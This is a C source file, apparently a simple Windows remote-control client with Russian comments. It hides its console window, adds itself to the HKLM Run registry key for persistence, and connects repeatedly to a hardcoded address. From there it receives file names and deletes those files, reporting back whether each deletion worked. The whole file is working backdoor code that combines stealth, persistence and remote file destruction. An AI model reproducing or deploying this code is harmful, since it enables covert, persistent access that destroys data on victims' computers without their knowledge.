#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <winsock2.h>
#include <winsock.h>
#include <windows.h>
#include <locale.h>
#include <ws2tcpip.h>

#pragma comment (lib, "Ws2_32.lib")

#define DEFAULT_FILE_NAME_LEN    200
#define IP                       "192.168.0.103"

void add_to_reg() {
    DWORD path = 0;
    char IpFilename[MAX_PATH];
    HKEY hKey;
    //  Получение пути файла
    path = GetModuleFileNameA(NULL, IpFilename, sizeof(IpFilename));
    //  Занесение в реестр
    RegOpenKey(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), &hKey); 

    DWORD pathlen = path * sizeof(*IpFilename);
    //  Добавление значения в реестр
    RegSetValueExA(hKey, "CLIENT", NULL, REG_SZ, (LPBYTE)IpFilename, pathlen);

    RegCloseKey(hKey);
}


int main(void)
{   
    //  Скрытие окна
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    //system("copy \"C:\\Users\\puuni\\Downloads\\myclient.exe\" \"C:\\Users\\puuni\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
    add_to_reg();
    setlocale(LC_ALL, "RUS");
    WSADATA wsa_data;
    SOCKET client_socket = INVALID_SOCKET;
    struct sockaddr_in addr;
    int result;
    char filename[DEFAULT_FILE_NAME_LEN];
    result = WSAStartup(MAKEWORD(1, 1), &wsa_data);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(12345);
    inet_pton(AF_INET, IP, &addr.sin_addr.s_addr);

    client_socket = socket(AF_INET, SOCK_STREAM, 0);
    while (connect(client_socket, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {}

    while (1) {
        int result_status;
        char result[2] = { '\0' };
        int recive = recv(client_socket, filename, sizeof(filename), 0);
        if (recive == SOCKET_ERROR) {
            addr.sin_family = AF_INET;
            addr.sin_port = htons(12345);
            inet_pton(AF_INET, IP, &addr.sin_addr.s_addr);
            client_socket = socket(AF_INET, SOCK_STREAM, 0);
            while (connect(client_socket, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {};
            break;
        }
        result_status = remove(filename);
        result[0] = result_status + '0';
        send(client_socket, result, sizeof(result), NULL);
        system("cls");
    }
}
